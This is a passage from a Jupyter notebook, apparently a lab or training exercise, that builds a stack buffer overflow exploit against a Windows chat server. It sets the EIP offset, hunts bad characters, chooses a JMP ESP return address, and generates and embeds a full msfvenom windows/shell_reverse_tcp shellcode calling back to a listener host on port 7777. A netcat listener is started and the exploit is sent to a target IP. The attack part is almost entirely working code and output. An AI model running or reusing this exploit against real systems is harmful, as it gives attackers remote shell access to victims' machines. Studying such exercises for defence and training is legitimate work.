   "id": "78e9aa24-f91c-40d9-ac9b-31960e662130",
   "metadata": {},
   "source": [
    "### Look for \"EIP Contains Normal Pattern:\" and get offset:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "4999fd54-5b13-490f-9a19-14a0c7795a9e",
   "metadata": {},
   "outputs": [],
   "source": [
    "offset = 2012"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ae6fdd2-5ad3-48e0-9fa6-67a2c5606da9",
   "metadata": {},
   "source": [
    "# Controlling EIP (next instruction pointer):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "id": "75e4c699-23f1-4499-b651-2a09a224891f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(\"\", offset=offset, retn=\"BBBB\", prefix=\"\") # BBBB is 42424242"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c520975-aa6b-44ec-9bc4-c9804c08be66",
   "metadata": {},
   "source": [
    "Re run in Immunity, verify we can overwrite EIP!\n",
    "\n",
    "EIP should be 42424242\n",
    "\n",
    "Note: ESP is pointer to current stack location, allows us to add data to stack."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c766514f-78df-4e4d-8a45-762b63bebaa9",
   "metadata": {},
   "source": [
    "# Finding Bad Chars:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 221,
   "id": "76b337f4-ee58-49cd-aad4-fe4537295357",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "zsh:1: command not found: mona\n"
     ]
    }
   ],
   "source": [
    "!mona bytearray -b \"\\x00\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "125fa823-8d7e-4aa6-b8c5-a4f5db6d8971",
   "metadata": {},
   "source": [
    "### Generate all possible chars:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "ec7e1b4b-d470-4a44-8ed6-92fe07ccb6ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_goodchars(badchars=\"\"):\n",
    "    bytearray_value = \"\"\n",
    "    \n",
    "    human_readable = bytes(badchars, encoding=\"unicode-escape\").decode(\"ascii\")\n",
    "    badints = [int(x, 16) for x in human_readable.split(\"\\\\\\\\x\")[1:]]\n",
    "    print(human_readable, badints)\n",
    "    \n",
    "    for x in range(1, 256):\n",
    "        if x in badints:\n",
    "            continue\n",
    "        else:\n",
    "            bytearray_value += \"\\\\x\" + \"{:02x}\".format(x)\n",
    "    bytearray_bytes =bytes(bytearray_value, encoding='ascii').decode('unicode_escape')\n",
    "    return bytearray_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "df6fcedc-37ad-4775-99fb-b50f972dc4f5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " []\n",
      "\u0001\u0002\u0003\u0004\u0005\u0006\t\n",
      "\u000e\u000f\u0010\u0011\u0012\u0013\u0014\u0015\u0016\u0017\u0018\u0019\u001a\u001b\u001c",
      "\u001d",
      "\u001e",
      "\u001f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
      " ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ\n"
     ]
    }
   ],
   "source": [
    "bytearray_value = get_goodchars()\n",
    "print(bytearray_value)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4a2b9c7d-cbd7-4922-a054-d19f824c0cc5",
   "metadata": {},
   "source": [
    "## Repeat from here!\n",
    "### Run and note ESP location:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "c85bdc65-c759-4851-953a-b7079152fbeb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(bytearray_value, offset=offset, retn=\"BBBB\", prefix=prefix)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd13b075-e92b-4e27-8a61-42a5ab2e8695",
   "metadata": {},
   "source": [
    "Get ESP Address"
   ]
  },
  {
   "cell_type": "raw",
   "id": "5bd9c4e6-4699-4385-8f21-b9e516ed8584",
   "metadata": {},
   "source": [
    "Note: ESP Location:\n",
    "0190FA30"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "id": "bcdf0b0b-b09b-426b-9357-c70ff3eb6c10",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "zsh:1: command not found: mona\n"
     ]
    }
   ],
   "source": [
    "!mona compare -f C:\\mona\\chatserver\\bytearray.bin -a 01A6EEC0"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c9f296cb-6b12-44e1-a49a-6cd1b3334502",
   "metadata": {},
   "source": [
    "^ Crashing immunity appears to be a successful result...\n",
    "\n",
    "Find characters that are not equal:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "id": "bd865271-82c8-485c-b17b-86456219cca6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('\\\\x00\\\\x', '\\\\x')"
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "raw_string = \"\"\n",
    "\n",
    "split_string = raw_string.split(\" \")\n",
    "final_string = []\n",
    "for i in range(1, len(split_string)):\n",
    "    if not int(split_string[i], 16) == int(split_string[i-1], 16) + 1:\n",
    "        final_string.append(split_string[i])\n",
    "badchars_full = \"\\\\x\"+\"\\\\x\".join(split_string)\n",
    "badchars_auto = \"\\\\x00\\\\x\"+\"\\\\x\".join(final_string)\n",
    "badchars_auto, badchars_full"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c6912ef5-f2ba-410e-bd4d-08e27dcf4154",
   "metadata": {},
   "source": [
    "NOTE: If you remove one and it comes back, keep it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5210bff9-987b-4585-b459-5cbc9922384b",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(badchars_full)\n",
    "keepme=\"\"\n",
    "badchars=badchars+keepme"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "c8ecb739-e1f5-4d37-8762-e4cab12ba9e8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona bytearray -b \"\\x00\"\n"
     ]
    }
   ],
   "source": [
    "# \"\\x00<OTHER BAD_CHARS>\"\n",
    "# Remmeber back to back badchars might not be bad chars! Don't remove secon ones in sequence\n",
    "# 00 11 12 40 41 5f 60 b8 b9 ee ef\n",
    "badchars = badchars_auto\n",
    "badchars = \"\\\\x00\"\n",
    "print(\"!mona bytearray -b\", '\"%s\"' % badchars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9382c18-37a9-45dd-a727-a52723fcdb14",
   "metadata": {},
   "outputs": [],
   "source": [
    "bytearray_value = get_goodchars(badchars)\n",
    "print(bytearray_value)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4bc253db-593f-445c-9aff-cc7eaa377cc0",
   "metadata": {},
   "source": [
    "### Repeat!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b5d93862-4a17-479a-b9b6-6c81a88da3e5",
   "metadata": {},
   "source": [
    "# Find Jump Point:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f16e0545-423c-4e47-a94d-49cdc065d061",
   "metadata": {},
   "source": [
    "### Make sure to run while program is running or crashed:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "1433f847-06fd-4fe3-8836-1e356d16dba0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona jmp -r esp -cpb \"\\x00\"\n"
     ]
    }
   ],
   "source": [
    "print(\"!mona jmp -r esp -cpb\", '\"%s\"' % badchars)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "374180e6-8881-4798-a4a2-7b115c6ddbd1",
   "metadata": {},
   "source": [
    "### Pick a jump point and record it:"
   ]
  },
  {
   "cell_type": "raw",
   "id": "ea2272ca-0735-43af-90cd-e22b9b0c9ca6",
   "metadata": {},
   "source": [
    "Address:\n",
    "\n",
    "625014DF\n",
    "62 50 14 DF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "id": "904e68a2-2f9c-4e67-8224-ce77a6a26eaa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bP\u0014ß , ß\u0014Pb\n"
     ]
    }
   ],
   "source": [
    "jump_forwards = \"\\x62\\x50\\x14\\xDF\"\n",
    "jump_backwards = \"\".join(list(reversed(jump_forwards))) # Little endian\n",
    "\n",
    "print(jump_forwards,\",\",jump_backwards)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "id": "992c60b2-e850-4c55-8452-0364c3b95c87",
   "metadata": {},
   "outputs": [],
   "source": [
    "final_retn = jump_backwards"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90e67328-c56d-4139-aa1a-7543238682cc",
   "metadata": {},
   "source": [
    "# Generate Payload:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "id": "e8243ecc-8a9b-4169-9434-82a6b940635c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n",
      "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000\n",
      "    inet 10.10.173.131/16 brd 10.10.255.255 scope global dynamic eth0\n"
     ]
    }
   ],
   "source": [
    "!ip a | grep 10."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "id": "f8e58f58-b309-490b-83c6-4f0125503cfc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: LHOST=10.10.173.131\n"
     ]
    }
   ],
   "source": [
    "%env LHOST=10.10.173.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "id": "4b8a7e49-e309-4458-8eed-178c0af36166",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "add to -b below\n",
      "\\x00\n"
     ]
    }
   ],
   "source": [
    "print(\"add to -b below\")\n",
    "print(badchars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "id": "3173552a-ae2a-40e4-a066-bca8c01ab7d9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n",
      "[-] No arch selected, selecting arch: x86 from the payload\n",
      "Found 11 compatible encoders\n",
      "Attempting to encode payload with 1 iterations of x86/shikata_ga_nai\n",
      "x86/shikata_ga_nai succeeded with size 351 (iteration=0)\n",
      "x86/shikata_ga_nai chosen with final size 351\n",
      "Payload size: 351 bytes\n",
      "Final size of c file: 1500 bytes\n",
      "unsigned char buf[] = \n",
      "\"\\xb8\\x63\\x71\\xf3\\xc2\\xdb\\xda\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\"\n",
      "\"\\x52\\x31\\x43\\x12\\x83\\xeb\\xfc\\x03\\x20\\x7f\\x11\\x37\\x5a\\x97\\x57\"\n",
      "\"\\xb8\\xa2\\x68\\x38\\x30\\x47\\x59\\x78\\x26\\x0c\\xca\\x48\\x2c\\x40\\xe7\"\n",
      "\"\\x23\\x60\\x70\\x7c\\x41\\xad\\x77\\x35\\xec\\x8b\\xb6\\xc6\\x5d\\xef\\xd9\"\n",
      "\"\\x44\\x9c\\x3c\\x39\\x74\\x6f\\x31\\x38\\xb1\\x92\\xb8\\x68\\x6a\\xd8\\x6f\"\n",
      "\"\\x9c\\x1f\\x94\\xb3\\x17\\x53\\x38\\xb4\\xc4\\x24\\x3b\\x95\\x5b\\x3e\\x62\"\n",
      "\"\\x35\\x5a\\x93\\x1e\\x7c\\x44\\xf0\\x1b\\x36\\xff\\xc2\\xd0\\xc9\\x29\\x1b\"\n",
      "\"\\x18\\x65\\x14\\x93\\xeb\\x77\\x51\\x14\\x14\\x02\\xab\\x66\\xa9\\x15\\x68\"\n",
      "\"\\x14\\x75\\x93\\x6a\\xbe\\xfe\\x03\\x56\\x3e\\xd2\\xd2\\x1d\\x4c\\x9f\\x91\"\n",
      "\"\\x79\\x51\\x1e\\x75\\xf2\\x6d\\xab\\x78\\xd4\\xe7\\xef\\x5e\\xf0\\xac\\xb4\"\n",
      "\"\\xff\\xa1\\x08\\x1a\\xff\\xb1\\xf2\\xc3\\xa5\\xba\\x1f\\x17\\xd4\\xe1\\x77\"\n",
      "\"\\xd4\\xd5\\x19\\x88\\x72\\x6d\\x6a\\xba\\xdd\\xc5\\xe4\\xf6\\x96\\xc3\\xf3\"\n",
      "\"\\xf9\\x8c\\xb4\\x6b\\x04\\x2f\\xc5\\xa2\\xc3\\x7b\\x95\\xdc\\xe2\\x03\\x7e\"\n",
      "\"\\x1c\\x0a\\xd6\\xd1\\x4c\\xa4\\x89\\x91\\x3c\\x04\\x7a\\x7a\\x56\\x8b\\xa5\"\n",
      "\"\\x9a\\x59\\x41\\xce\\x31\\xa0\\x02\\xfb\\xcf\\x07\\x51\\x93\\xcd\\x57\\x48\"\n",
      "\"\\x05\\x5b\\xb1\\x1e\\xd5\\x0d\\x6a\\xb7\\x4c\\x14\\xe0\\x26\\x90\\x82\\x8d\"\n",
      "\"\\x69\\x1a\\x21\\x72\\x27\\xeb\\x4c\\x60\\xd0\\x1b\\x1b\\xda\\x77\\x23\\xb1\"\n",
      "\"\\x72\\x1b\\xb6\\x5e\\x82\\x52\\xab\\xc8\\xd5\\x33\\x1d\\x01\\xb3\\xa9\\x04\"\n",
      "\"\\xbb\\xa1\\x33\\xd0\\x84\\x61\\xe8\\x21\\x0a\\x68\\x7d\\x1d\\x28\\x7a\\xbb\"\n",
      "\"\\x9e\\x74\\x2e\\x13\\xc9\\x22\\x98\\xd5\\xa3\\x84\\x72\\x8c\\x18\\x4f\\x12\"\n",
      "\"\\x49\\x53\\x50\\x64\\x56\\xbe\\x26\\x88\\xe7\\x17\\x7f\\xb7\\xc8\\xff\\x77\"\n",
      "\"\\xc0\\x34\\x60\\x77\\x1b\\xfd\\x80\\x9a\\x89\\x08\\x29\\x03\\x58\\xb1\\x34\"\n",
      "\"\\xb4\\xb7\\xf6\\x40\\x37\\x3d\\x87\\xb6\\x27\\x34\\x82\\xf3\\xef\\xa5\\xfe\"\n",
      "\"\\x6c\\x9a\\xc9\\xad\\x8d\\x8f\";\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "!msfvenom -p windows/shell_reverse_tcp LHOST={os.environ[\"LHOST\"]} LPORT=7777 EXITFUNC=thread -b \"\\x00\" -f c\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "id": "13d5f6f3-5311-423a-94da-3ecba0e2502c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "¸cqóÂÛÚÙt$ô[1É±R1C\u0012ëü\u0003 \u00117ZW¸¢h80GYx&\f",
      "ÊH,@ç#`p|A­w5ì¶Æ]ïÙD<9to18±¸hjØo\u001f³\u0017S8´Ä$;[>b5Z\u001e",
      "|Dð\u001b6ÿÂÐÉ)\u001b\u0018e\u0014ëwQ\u0014\u0014\u0002«f©\u0015h\u0014uj¾þ\u0003V>ÒÒ\u001d",
      "LyQ\u001e",
      "uòm«xÔçï^ð¬´ÿ\u001aÿ±òÃ¥º\u001f\u0017ÔáwÔÕ\u0019rmjºÝÅäöÃóù´k\u0004/Å¢Ã{Üâ\u0003~\u001c",
      "\n",
      "j·L\u0014à&i\u001a!r'ëL`Ð\u001b\u001bÚw#±r\u001b¶^R«ÈÕ3\u001d",
      "\u0001³©\u0004»¡3Ðaè!\n",
      "h}\u001d",
      "(z»t.\u0013É\"Õ£r\u0018O\u0012ISPdV¾&ç\u0017·ÈÿwÀ4`w\u001bý)\u0003X±4´·ö@7=¶'4óï¥þlÉ­\n"
     ]
    }
   ],
   "source": [
    "final_payload = (\"\\xb8\\x63\\x71\\xf3\\xc2\\xdb\\xda\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\"\n",
    "\"\\x52\\x31\\x43\\x12\\x83\\xeb\\xfc\\x03\\x20\\x7f\\x11\\x37\\x5a\\x97\\x57\"\n",
    "\"\\xb8\\xa2\\x68\\x38\\x30\\x47\\x59\\x78\\x26\\x0c\\xca\\x48\\x2c\\x40\\xe7\"\n",
    "\"\\x23\\x60\\x70\\x7c\\x41\\xad\\x77\\x35\\xec\\x8b\\xb6\\xc6\\x5d\\xef\\xd9\"\n",
    "\"\\x44\\x9c\\x3c\\x39\\x74\\x6f\\x31\\x38\\xb1\\x92\\xb8\\x68\\x6a\\xd8\\x6f\"\n",
    "\"\\x9c\\x1f\\x94\\xb3\\x17\\x53\\x38\\xb4\\xc4\\x24\\x3b\\x95\\x5b\\x3e\\x62\"\n",
    "\"\\x35\\x5a\\x93\\x1e\\x7c\\x44\\xf0\\x1b\\x36\\xff\\xc2\\xd0\\xc9\\x29\\x1b\"\n",
    "\"\\x18\\x65\\x14\\x93\\xeb\\x77\\x51\\x14\\x14\\x02\\xab\\x66\\xa9\\x15\\x68\"\n",
    "\"\\x14\\x75\\x93\\x6a\\xbe\\xfe\\x03\\x56\\x3e\\xd2\\xd2\\x1d\\x4c\\x9f\\x91\"\n",
    "\"\\x79\\x51\\x1e\\x75\\xf2\\x6d\\xab\\x78\\xd4\\xe7\\xef\\x5e\\xf0\\xac\\xb4\"\n",
    "\"\\xff\\xa1\\x08\\x1a\\xff\\xb1\\xf2\\xc3\\xa5\\xba\\x1f\\x17\\xd4\\xe1\\x77\"\n",
    "\"\\xd4\\xd5\\x19\\x88\\x72\\x6d\\x6a\\xba\\xdd\\xc5\\xe4\\xf6\\x96\\xc3\\xf3\"\n",
    "\"\\xf9\\x8c\\xb4\\x6b\\x04\\x2f\\xc5\\xa2\\xc3\\x7b\\x95\\xdc\\xe2\\x03\\x7e\"\n",
    "\"\\x1c\\x0a\\xd6\\xd1\\x4c\\xa4\\x89\\x91\\x3c\\x04\\x7a\\x7a\\x56\\x8b\\xa5\"\n",
    "\"\\x9a\\x59\\x41\\xce\\x31\\xa0\\x02\\xfb\\xcf\\x07\\x51\\x93\\xcd\\x57\\x48\"\n",
    "\"\\x05\\x5b\\xb1\\x1e\\xd5\\x0d\\x6a\\xb7\\x4c\\x14\\xe0\\x26\\x90\\x82\\x8d\"\n",
    "\"\\x69\\x1a\\x21\\x72\\x27\\xeb\\x4c\\x60\\xd0\\x1b\\x1b\\xda\\x77\\x23\\xb1\"\n",
    "\"\\x72\\x1b\\xb6\\x5e\\x82\\x52\\xab\\xc8\\xd5\\x33\\x1d\\x01\\xb3\\xa9\\x04\"\n",
    "\"\\xbb\\xa1\\x33\\xd0\\x84\\x61\\xe8\\x21\\x0a\\x68\\x7d\\x1d\\x28\\x7a\\xbb\"\n",
    "\"\\x9e\\x74\\x2e\\x13\\xc9\\x22\\x98\\xd5\\xa3\\x84\\x72\\x8c\\x18\\x4f\\x12\"\n",
    "\"\\x49\\x53\\x50\\x64\\x56\\xbe\\x26\\x88\\xe7\\x17\\x7f\\xb7\\xc8\\xff\\x77\"\n",
    "\"\\xc0\\x34\\x60\\x77\\x1b\\xfd\\x80\\x9a\\x89\\x08\\x29\\x03\\x58\\xb1\\x34\"\n",
    "\"\\xb4\\xb7\\xf6\\x40\\x37\\x3d\\x87\\xb6\\x27\\x34\\x82\\xf3\\xef\\xa5\\xfe\"\n",
    "\"\\x6c\\x9a\\xc9\\xad\\x8d\\x8f\")\n",
    "\n",
    "print(final_payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6bc3aded-959e-4790-b6b1-1008e59e53fa",
   "metadata": {},
   "source": [
    "# Add Padding:\n",
    "\n",
    "This gives the exploit room to unpack itself"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "fc5660a6-bf1f-4f0b-880c-33fbf8e99681",
   "metadata": {},
   "outputs": [],
   "source": [
    "padding = \"\\x90\" * 16"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b8a4c36c-b830-4de4-b2aa-b04f7b5bf131",
   "metadata": {},
   "source": [
    "# Run Exploit:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "10e36d28-a8cd-4499-abb6-70efb67ce4cb",
   "metadata": {},
   "source": [
    "Run Netcat:"
   ]
  },
  {
   "cell_type": "raw",
   "id": "332f8dd7-10fc-406c-80aa-99059beb1758",
   "metadata": {},
   "source": [
    "nc -lvnp 7777"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "id": "5ae61a41-fd4f-472f-8331-9781ab1ded19",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(final_payload, offset=offset, retn=final_retn, padding=padding, prefix=prefix)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "id": "e42460be-ce92-459a-b69e-37617fd7a56a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "target = \"10.10.92.230\"\n",
    "run_overflow(final_payload, offset=offset, retn=final_retn, padding=padding, prefix=prefix, target=target)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb60a747-4a27-42e6-a8f3-a2f282a4aa17",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
